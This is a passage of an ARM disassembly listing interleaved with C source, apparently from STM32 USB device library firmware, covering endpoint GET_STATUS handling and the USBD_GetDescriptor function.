 800bae4:	6839      	ldr	r1, [r7, #0]
 800bae6:	6878      	ldr	r0, [r7, #4]
 800bae8:	f000 fc2d 	bl	800c346 <USBD_CtlError>
              break;
 800baec:	e000      	b.n	800baf0 <USBD_StdEPReq+0x1c8>
              break;
 800baee:	bf00      	nop
          }
          break;
 800baf0:	e0ab      	b.n	800bc4a <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800baf2:	687b      	ldr	r3, [r7, #4]
 800baf4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800baf8:	b2db      	uxtb	r3, r3
 800bafa:	2b02      	cmp	r3, #2
 800bafc:	d002      	beq.n	800bb04 <USBD_StdEPReq+0x1dc>
 800bafe:	2b03      	cmp	r3, #3
 800bb00:	d032      	beq.n	800bb68 <USBD_StdEPReq+0x240>
 800bb02:	e097      	b.n	800bc34 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bb04:	7bbb      	ldrb	r3, [r7, #14]
 800bb06:	2b00      	cmp	r3, #0
 800bb08:	d007      	beq.n	800bb1a <USBD_StdEPReq+0x1f2>
 800bb0a:	7bbb      	ldrb	r3, [r7, #14]
 800bb0c:	2b80      	cmp	r3, #128	; 0x80
 800bb0e:	d004      	beq.n	800bb1a <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800bb10:	6839      	ldr	r1, [r7, #0]
 800bb12:	6878      	ldr	r0, [r7, #4]
 800bb14:	f000 fc17 	bl	800c346 <USBD_CtlError>
                break;
 800bb18:	e091      	b.n	800bc3e <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bb1a:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bb1e:	2b00      	cmp	r3, #0
 800bb20:	da0b      	bge.n	800bb3a <USBD_StdEPReq+0x212>
 800bb22:	7bbb      	ldrb	r3, [r7, #14]
 800bb24:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bb28:	4613      	mov	r3, r2
 800bb2a:	009b      	lsls	r3, r3, #2
 800bb2c:	4413      	add	r3, r2
 800bb2e:	009b      	lsls	r3, r3, #2
 800bb30:	3310      	adds	r3, #16
 800bb32:	687a      	ldr	r2, [r7, #4]
 800bb34:	4413      	add	r3, r2
 800bb36:	3304      	adds	r3, #4
 800bb38:	e00b      	b.n	800bb52 <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bb3a:	7bbb      	ldrb	r3, [r7, #14]
 800bb3c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bb40:	4613      	mov	r3, r2
 800bb42:	009b      	lsls	r3, r3, #2
 800bb44:	4413      	add	r3, r2
 800bb46:	009b      	lsls	r3, r3, #2
 800bb48:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bb4c:	687a      	ldr	r2, [r7, #4]
 800bb4e:	4413      	add	r3, r2
 800bb50:	3304      	adds	r3, #4
 800bb52:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800bb54:	68bb      	ldr	r3, [r7, #8]
 800bb56:	2200      	movs	r2, #0
 800bb58:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bb5a:	68bb      	ldr	r3, [r7, #8]
 800bb5c:	2202      	movs	r2, #2
 800bb5e:	4619      	mov	r1, r3
 800bb60:	6878      	ldr	r0, [r7, #4]
 800bb62:	f000 fc61 	bl	800c428 <USBD_CtlSendData>
              break;
 800bb66:	e06a      	b.n	800bc3e <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800bb68:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bb6c:	2b00      	cmp	r3, #0
 800bb6e:	da11      	bge.n	800bb94 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800bb70:	7bbb      	ldrb	r3, [r7, #14]
 800bb72:	f003 020f 	and.w	r2, r3, #15
 800bb76:	6879      	ldr	r1, [r7, #4]
 800bb78:	4613      	mov	r3, r2
 800bb7a:	009b      	lsls	r3, r3, #2
 800bb7c:	4413      	add	r3, r2
 800bb7e:	009b      	lsls	r3, r3, #2
 800bb80:	440b      	add	r3, r1
 800bb82:	3324      	adds	r3, #36	; 0x24
 800bb84:	881b      	ldrh	r3, [r3, #0]
 800bb86:	2b00      	cmp	r3, #0
 800bb88:	d117      	bne.n	800bbba <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bb8a:	6839      	ldr	r1, [r7, #0]
 800bb8c:	6878      	ldr	r0, [r7, #4]
 800bb8e:	f000 fbda 	bl	800c346 <USBD_CtlError>
                  break;
 800bb92:	e054      	b.n	800bc3e <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800bb94:	7bbb      	ldrb	r3, [r7, #14]
 800bb96:	f003 020f 	and.w	r2, r3, #15
 800bb9a:	6879      	ldr	r1, [r7, #4]
 800bb9c:	4613      	mov	r3, r2
 800bb9e:	009b      	lsls	r3, r3, #2
 800bba0:	4413      	add	r3, r2
 800bba2:	009b      	lsls	r3, r3, #2
 800bba4:	440b      	add	r3, r1
 800bba6:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800bbaa:	881b      	ldrh	r3, [r3, #0]
 800bbac:	2b00      	cmp	r3, #0
 800bbae:	d104      	bne.n	800bbba <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bbb0:	6839      	ldr	r1, [r7, #0]
 800bbb2:	6878      	ldr	r0, [r7, #4]
 800bbb4:	f000 fbc7 	bl	800c346 <USBD_CtlError>
                  break;
 800bbb8:	e041      	b.n	800bc3e <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbba:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bbbe:	2b00      	cmp	r3, #0
 800bbc0:	da0b      	bge.n	800bbda <USBD_StdEPReq+0x2b2>
 800bbc2:	7bbb      	ldrb	r3, [r7, #14]
 800bbc4:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bbc8:	4613      	mov	r3, r2
 800bbca:	009b      	lsls	r3, r3, #2
 800bbcc:	4413      	add	r3, r2
 800bbce:	009b      	lsls	r3, r3, #2
 800bbd0:	3310      	adds	r3, #16
 800bbd2:	687a      	ldr	r2, [r7, #4]
 800bbd4:	4413      	add	r3, r2
 800bbd6:	3304      	adds	r3, #4
 800bbd8:	e00b      	b.n	800bbf2 <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bbda:	7bbb      	ldrb	r3, [r7, #14]
 800bbdc:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbe0:	4613      	mov	r3, r2
 800bbe2:	009b      	lsls	r3, r3, #2
 800bbe4:	4413      	add	r3, r2
 800bbe6:	009b      	lsls	r3, r3, #2
 800bbe8:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bbec:	687a      	ldr	r2, [r7, #4]
 800bbee:	4413      	add	r3, r2
 800bbf0:	3304      	adds	r3, #4
 800bbf2:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800bbf4:	7bbb      	ldrb	r3, [r7, #14]
 800bbf6:	2b00      	cmp	r3, #0
 800bbf8:	d002      	beq.n	800bc00 <USBD_StdEPReq+0x2d8>
 800bbfa:	7bbb      	ldrb	r3, [r7, #14]
 800bbfc:	2b80      	cmp	r3, #128	; 0x80
 800bbfe:	d103      	bne.n	800bc08 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800bc00:	68bb      	ldr	r3, [r7, #8]
 800bc02:	2200      	movs	r2, #0
 800bc04:	601a      	str	r2, [r3, #0]
 800bc06:	e00e      	b.n	800bc26 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800bc08:	7bbb      	ldrb	r3, [r7, #14]
 800bc0a:	4619      	mov	r1, r3
 800bc0c:	6878      	ldr	r0, [r7, #4]
 800bc0e:	f001 f979 	bl	800cf04 <USBD_LL_IsStallEP>
 800bc12:	4603      	mov	r3, r0
 800bc14:	2b00      	cmp	r3, #0
 800bc16:	d003      	beq.n	800bc20 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bc18:	68bb      	ldr	r3, [r7, #8]
 800bc1a:	2201      	movs	r2, #1
 800bc1c:	601a      	str	r2, [r3, #0]
 800bc1e:	e002      	b.n	800bc26 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800bc20:	68bb      	ldr	r3, [r7, #8]
 800bc22:	2200      	movs	r2, #0
 800bc24:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bc26:	68bb      	ldr	r3, [r7, #8]
 800bc28:	2202      	movs	r2, #2
 800bc2a:	4619      	mov	r1, r3
 800bc2c:	6878      	ldr	r0, [r7, #4]
 800bc2e:	f000 fbfb 	bl	800c428 <USBD_CtlSendData>
              break;
 800bc32:	e004      	b.n	800bc3e <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bc34:	6839      	ldr	r1, [r7, #0]
 800bc36:	6878      	ldr	r0, [r7, #4]
 800bc38:	f000 fb85 	bl	800c346 <USBD_CtlError>
              break;
 800bc3c:	bf00      	nop
          }
          break;
 800bc3e:	e004      	b.n	800bc4a <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800bc40:	6839      	ldr	r1, [r7, #0]
 800bc42:	6878      	ldr	r0, [r7, #4]
 800bc44:	f000 fb7f 	bl	800c346 <USBD_CtlError>
          break;
 800bc48:	bf00      	nop
      }
      break;
 800bc4a:	e005      	b.n	800bc58 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bc4c:	6839      	ldr	r1, [r7, #0]
 800bc4e:	6878      	ldr	r0, [r7, #4]
 800bc50:	f000 fb79 	bl	800c346 <USBD_CtlError>
      break;
 800bc54:	e000      	b.n	800bc58 <USBD_StdEPReq+0x330>
      break;
 800bc56:	bf00      	nop
  }

  return ret;
 800bc58:	7bfb      	ldrb	r3, [r7, #15]
}
 800bc5a:	4618      	mov	r0, r3
 800bc5c:	3710      	adds	r7, #16
 800bc5e:	46bd      	mov	sp, r7
 800bc60:	bd80      	pop	{r7, pc}
	...

0800bc64 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bc64:	b580      	push	{r7, lr}
 800bc66:	b084      	sub	sp, #16
 800bc68:	af00      	add	r7, sp, #0
 800bc6a:	6078      	str	r0, [r7, #4]
 800bc6c:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bc6e:	2300      	movs	r3, #0
 800bc70:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bc72:	2300      	movs	r3, #0
 800bc74:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bc76:	2300      	movs	r3, #0
 800bc78:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bc7a:	683b      	ldr	r3, [r7, #0]
 800bc7c:	885b      	ldrh	r3, [r3, #2]
 800bc7e:	0a1b      	lsrs	r3, r3, #8
 800bc80:	b29b      	uxth	r3, r3
 800bc82:	3b01      	subs	r3, #1
 800bc84:	2b0e      	cmp	r3, #14
 800bc86:	f200 8152 	bhi.w	800bf2e <USBD_GetDescriptor+0x2ca>
 800bc8a:	a201      	add	r2, pc, #4	; (adr r2, 800bc90 <USBD_GetDescriptor+0x2c>)
 800bc8c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bc90:	0800bd01 	.word	0x0800bd01
 800bc94:	0800bd19 	.word	0x0800bd19
 800bc98:	0800bd59 	.word	0x0800bd59
 800bc9c:	0800bf2f 	.word	0x0800bf2f
 800bca0:	0800bf2f 	.word	0x0800bf2f
 800bca4:	0800becf 	.word	0x0800becf
 800bca8:	0800befb 	.word	0x0800befb
 800bcac:	0800bf2f 	.word	0x0800bf2f
 800bcb0:	0800bf2f 	.word	0x0800bf2f
 800bcb4:	0800bf2f 	.word	0x0800bf2f
 800bcb8:	0800bf2f 	.word	0x0800bf2f
 800bcbc:	0800bf2f 	.word	0x0800bf2f
 800bcc0:	0800bf2f 	.word	0x0800bf2f
 800bcc4:	0800bf2f 	.word	0x0800bf2f
 800bcc8:	0800bccd 	.word	0x0800bccd
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bccc:	687b      	ldr	r3, [r7, #4]
 800bcce:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcd2:	69db      	ldr	r3, [r3, #28]
 800bcd4:	2b00      	cmp	r3, #0
 800bcd6:	d00b      	beq.n	800bcf0 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bcd8:	687b      	ldr	r3, [r7, #4]
 800bcda:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcde:	69db      	ldr	r3, [r3, #28]
 800bce0:	687a      	ldr	r2, [r7, #4]
 800bce2:	7c12      	ldrb	r2, [r2, #16]
 800bce4:	f107 0108 	add.w	r1, r7, #8
 800bce8:	4610      	mov	r0, r2
 800bcea:	4798      	blx	r3
 800bcec:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bcee:	e126      	b.n	800bf3e <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bcf0:	6839      	ldr	r1, [r7, #0]
 800bcf2:	6878      	ldr	r0, [r7, #4]
 800bcf4:	f000 fb27 	bl	800c346 <USBD_CtlError>
        err++;
 800bcf8:	7afb      	ldrb	r3, [r7, #11]
 800bcfa:	3301      	adds	r3, #1
 800bcfc:	72fb      	strb	r3, [r7, #11]
      break;
 800bcfe:	e11e      	b.n	800bf3e <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bd00:	687b      	ldr	r3, [r7, #4]
 800bd02:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd06:	681b      	ldr	r3, [r3, #0]
 800bd08:	687a      	ldr	r2, [r7, #4]
 800bd0a:	7c12      	ldrb	r2, [r2, #16]
 800bd0c:	f107 0108 	add.w	r1, r7, #8
 800bd10:	4610      	mov	r0, r2
 800bd12:	4798      	blx	r3
 800bd14:	60f8      	str	r0, [r7, #12]
      break;
 800bd16:	e112      	b.n	800bf3e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd18:	687b      	ldr	r3, [r7, #4]
 800bd1a:	7c1b      	ldrb	r3, [r3, #16]
 800bd1c:	2b00      	cmp	r3, #0
 800bd1e:	d10d      	bne.n	800bd3c <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bd20:	687b      	ldr	r3, [r7, #4]
 800bd22:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd26:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bd28:	f107 0208 	add.w	r2, r7, #8
 800bd2c:	4610      	mov	r0, r2
 800bd2e:	4798      	blx	r3
 800bd30:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bd32:	68fb      	ldr	r3, [r7, #12]
 800bd34:	3301      	adds	r3, #1
 800bd36:	2202      	movs	r2, #2
 800bd38:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bd3a:	e100      	b.n	800bf3e <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bd3c:	687b      	ldr	r3, [r7, #4]
 800bd3e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd42:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bd44:	f107 0208 	add.w	r2, r7, #8
 800bd48:	4610      	mov	r0, r2
 800bd4a:	4798      	blx	r3
 800bd4c:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bd4e:	68fb      	ldr	r3, [r7, #12]
 800bd50:	3301      	adds	r3, #1
 800bd52:	2202      	movs	r2, #2
 800bd54:	701a      	strb	r2, [r3, #0]
      break;
 800bd56:	e0f2      	b.n	800bf3e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bd58:	683b      	ldr	r3, [r7, #0]
 800bd5a:	885b      	ldrh	r3, [r3, #2]
 800bd5c:	b2db      	uxtb	r3, r3
 800bd5e:	2b05      	cmp	r3, #5
 800bd60:	f200 80ac 	bhi.w	800bebc <USBD_GetDescriptor+0x258>
 800bd64:	a201      	add	r2, pc, #4	; (adr r2, 800bd6c <USBD_GetDescriptor+0x108>)
 800bd66:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bd6a:	bf00      	nop
 800bd6c:	0800bd85 	.word	0x0800bd85
 800bd70:	0800bdb9 	.word	0x0800bdb9
 800bd74:	0800bded 	.word	0x0800bded
 800bd78:	0800be21 	.word	0x0800be21
 800bd7c:	0800be55 	.word	0x0800be55
 800bd80:	0800be89 	.word	0x0800be89
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bd84:	687b      	ldr	r3, [r7, #4]
 800bd86:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd8a:	685b      	ldr	r3, [r3, #4]
 800bd8c:	2b00      	cmp	r3, #0
 800bd8e:	d00b      	beq.n	800bda8 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bd90:	687b      	ldr	r3, [r7, #4]
 800bd92:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd96:	685b      	ldr	r3, [r3, #4]
 800bd98:	687a      	ldr	r2, [r7, #4]
 800bd9a:	7c12      	ldrb	r2, [r2, #16]
 800bd9c:	f107 0108 	add.w	r1, r7, #8
 800bda0:	4610      	mov	r0, r2
 800bda2:	4798      	blx	r3
 800bda4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bda6:	e091      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bda8:	6839      	ldr	r1, [r7, #0]
 800bdaa:	6878      	ldr	r0, [r7, #4]
 800bdac:	f000 facb 	bl	800c346 <USBD_CtlError>
            err++;
 800bdb0:	7afb      	ldrb	r3, [r7, #11]
 800bdb2:	3301      	adds	r3, #1
 800bdb4:	72fb      	strb	r3, [r7, #11]
          break;
 800bdb6:	e089      	b.n	800becc <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bdb8:	687b      	ldr	r3, [r7, #4]
 800bdba:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdbe:	689b      	ldr	r3, [r3, #8]
 800bdc0:	2b00      	cmp	r3, #0
 800bdc2:	d00b      	beq.n	800bddc <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bdc4:	687b      	ldr	r3, [r7, #4]
 800bdc6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdca:	689b      	ldr	r3, [r3, #8]
 800bdcc:	687a      	ldr	r2, [r7, #4]
 800bdce:	7c12      	ldrb	r2, [r2, #16]
 800bdd0:	f107 0108 	add.w	r1, r7, #8
 800bdd4:	4610      	mov	r0, r2
 800bdd6:	4798      	blx	r3
 800bdd8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bdda:	e077      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bddc:	6839      	ldr	r1, [r7, #0]
 800bdde:	6878      	ldr	r0, [r7, #4]
 800bde0:	f000 fab1 	bl	800c346 <USBD_CtlError>
            err++;
 800bde4:	7afb      	ldrb	r3, [r7, #11]
 800bde6:	3301      	adds	r3, #1
 800bde8:	72fb      	strb	r3, [r7, #11]
          break;
 800bdea:	e06f      	b.n	800becc <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bdec:	687b      	ldr	r3, [r7, #4]
 800bdee:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdf2:	68db      	ldr	r3, [r3, #12]
 800bdf4:	2b00      	cmp	r3, #0
 800bdf6:	d00b      	beq.n	800be10 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bdf8:	687b      	ldr	r3, [r7, #4]
 800bdfa:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdfe:	68db      	ldr	r3, [r3, #12]
 800be00:	687a      	ldr	r2, [r7, #4]
 800be02:	7c12      	ldrb	r2, [r2, #16]
 800be04:	f107 0108 	add.w	r1, r7, #8
 800be08:	4610      	mov	r0, r2
 800be0a:	4798      	blx	r3
 800be0c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be0e:	e05d      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be10:	6839      	ldr	r1, [r7, #0]
 800be12:	6878      	ldr	r0, [r7, #4]
 800be14:	f000 fa97 	bl	800c346 <USBD_CtlError>
            err++;
 800be18:	7afb      	ldrb	r3, [r7, #11]
 800be1a:	3301      	adds	r3, #1
 800be1c:	72fb      	strb	r3, [r7, #11]
          break;
 800be1e:	e055      	b.n	800becc <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800be20:	687b      	ldr	r3, [r7, #4]
 800be22:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be26:	691b      	ldr	r3, [r3, #16]
 800be28:	2b00      	cmp	r3, #0
 800be2a:	d00b      	beq.n	800be44 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800be2c:	687b      	ldr	r3, [r7, #4]
 800be2e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be32:	691b      	ldr	r3, [r3, #16]
 800be34:	687a      	ldr	r2, [r7, #4]
 800be36:	7c12      	ldrb	r2, [r2, #16]
 800be38:	f107 0108 	add.w	r1, r7, #8
 800be3c:	4610      	mov	r0, r2
 800be3e:	4798      	blx	r3
 800be40:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be42:	e043      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be44:	6839      	ldr	r1, [r7, #0]
 800be46:	6878      	ldr	r0, [r7, #4]
 800be48:	f000 fa7d 	bl	800c346 <USBD_CtlError>
            err++;
 800be4c:	7afb      	ldrb	r3, [r7, #11]
 800be4e:	3301      	adds	r3, #1
 800be50:	72fb      	strb	r3, [r7, #11]
          break;
 800be52:	e03b      	b.n	800becc <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800be54:	687b      	ldr	r3, [r7, #4]
 800be56:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be5a:	695b      	ldr	r3, [r3, #20]
 800be5c:	2b00      	cmp	r3, #0
 800be5e:	d00b      	beq.n	800be78 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800be60:	687b      	ldr	r3, [r7, #4]
 800be62:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be66:	695b      	ldr	r3, [r3, #20]
 800be68:	687a      	ldr	r2, [r7, #4]
 800be6a:	7c12      	ldrb	r2, [r2, #16]
 800be6c:	f107 0108 	add.w	r1, r7, #8
 800be70:	4610      	mov	r0, r2
 800be72:	4798      	blx	r3
 800be74:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be76:	e029      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be78:	6839      	ldr	r1, [r7, #0]
 800be7a:	6878      	ldr	r0, [r7, #4]
 800be7c:	f000 fa63 	bl	800c346 <USBD_CtlError>
            err++;
 800be80:	7afb      	ldrb	r3, [r7, #11]
 800be82:	3301      	adds	r3, #1
 800be84:	72fb      	strb	r3, [r7, #11]
          break;
 800be86:	e021      	b.n	800becc <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800be88:	687b      	ldr	r3, [r7, #4]
 800be8a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be8e:	699b      	ldr	r3, [r3, #24]
 800be90:	2b00      	cmp	r3, #0
 800be92:	d00b      	beq.n	800beac <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800be94:	687b      	ldr	r3, [r7, #4]
 800be96:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be9a:	699b      	ldr	r3, [r3, #24]
 800be9c:	687a      	ldr	r2, [r7, #4]
 800be9e:	7c12      	ldrb	r2, [r2, #16]
 800bea0:	f107 0108 	add.w	r1, r7, #8
 800bea4:	4610      	mov	r0, r2
 800bea6:	4798      	blx	r3
 800bea8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800beaa:	e00f      	b.n	800becc <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800beac:	6839      	ldr	r1, [r7, #0]
 800beae:	6878      	ldr	r0, [r7, #4]
 800beb0:	f000 fa49 	bl	800c346 <USBD_CtlError>
            err++;
 800beb4:	7afb      	ldrb	r3, [r7, #11]
 800beb6:	3301      	adds	r3, #1
 800beb8:	72fb      	strb	r3, [r7, #11]
          break;
 800beba:	e007      	b.n	800becc <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bebc:	6839      	ldr	r1, [r7, #0]
 800bebe:	6878      	ldr	r0, [r7, #4]
 800bec0:	f000 fa41 	bl	800c346 <USBD_CtlError>
          err++;
 800bec4:	7afb      	ldrb	r3, [r7, #11]
 800bec6:	3301      	adds	r3, #1
 800bec8:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800beca:	bf00      	nop
      }
      break;
 800becc:	e037      	b.n	800bf3e <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bece:	687b      	ldr	r3, [r7, #4]
 800bed0:	7c1b      	ldrb	r3, [r3, #16]
 800bed2:	2b00      	cmp	r3, #0
 800bed4:	d109      	bne.n	800beea <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bed6:	687b      	ldr	r3, [r7, #4]
 800bed8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bedc:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bede:	f107 0208 	add.w	r2, r7, #8
 800bee2:	4610      	mov	r0, r2
 800bee4:	4798      	blx	r3
